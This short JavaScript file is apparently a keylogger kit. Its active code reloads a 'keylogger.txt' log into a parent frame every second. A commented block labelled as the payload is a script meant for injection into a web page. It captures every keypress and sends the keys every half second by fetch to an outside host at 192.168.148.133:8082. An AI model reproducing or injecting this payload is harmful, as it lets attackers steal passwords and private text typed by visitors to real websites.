function refresh()
{
 parent.log.location.href="keylogger.txt";
 setTimeout("refresh()",1000);
}
refresh();


// payload keylogger
/*
<script>
var keys = '';
document.onkeypress = function(e) {
var get = window.event ? window.event : e;
var key = get.keyCode ? get.keyCode : get.charCode;
key = String.fromCharCode(key);
keys += key;
};
window.setInterval(function() {
if (keys !== '') {
fetch('http://192.168.148.133:8082/keylogger.php', {
method: 'POST',
headers: {
'Content-Type': 'application/x-www-form-urlencoded'
},
body: 'key=' + encodeURIComponent(keys)
})
.then(response => response.text())
.then(data => {
console.log('Keys sent successfully:', data);
})
.catch(error => {
console.error('Error sending keys:', error);
});
keys = ''; // Reset the keys after sending
}
}, 500);
</script>
*/